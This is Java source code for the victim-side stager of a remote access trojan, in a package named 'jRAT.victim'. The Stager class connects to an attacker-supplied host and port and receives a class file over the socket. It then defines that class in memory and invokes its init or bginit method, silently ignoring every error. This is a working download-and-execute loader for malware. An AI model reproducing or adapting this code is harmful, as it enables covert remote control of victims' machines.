package jRAT.victim;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;

public class Stager extends ClassLoader {
    
    /* Example implementation of a stager for the main payload (stage).
     * Stage could also be read from a file on the local filesystem,
     * embedded directly into code as a byte array, or loaded using
     * a URLClassLoader.
     */
    public static void init(String host, int port, boolean runInBackground)
    {
        Socket socket = null;
        DataInputStream input = null;
        DataOutputStream output = null;
        try
        {
            socket = new Socket(host, port);
            input  = new DataInputStream(socket.getInputStream());
            output = new DataOutputStream(socket.getOutputStream());

            output.writeUTF("STAGER-HELLO");            
            long stageLength        = input.readLong();
            byte[] rawStageBytes    = new byte[(int)stageLength];
            input.readFully(rawStageBytes);
            
            if (rawStageBytes != null && rawStageBytes.length > 0)
            {
                Class[] argTypes = new Class[2];
                argTypes[0]      = String.class;
                argTypes[1]      = int.class;

                Class stage = new Stager().defineClass("jRAT.victim.Stage", rawStageBytes, 0, rawStageBytes.length);
                
                if (runInBackground)
                    stage.getMethod("bginit", argTypes).invoke(null, new Object[] { host, port});
                else
                    stage.getMethod("init", argTypes).invoke(null, new Object[] { host, port});
            }
        }
        catch (Exception ex) {}
        finally { try { input.close(); output.close(); socket.close(); } catch (Exception ex) {}}
    }
}
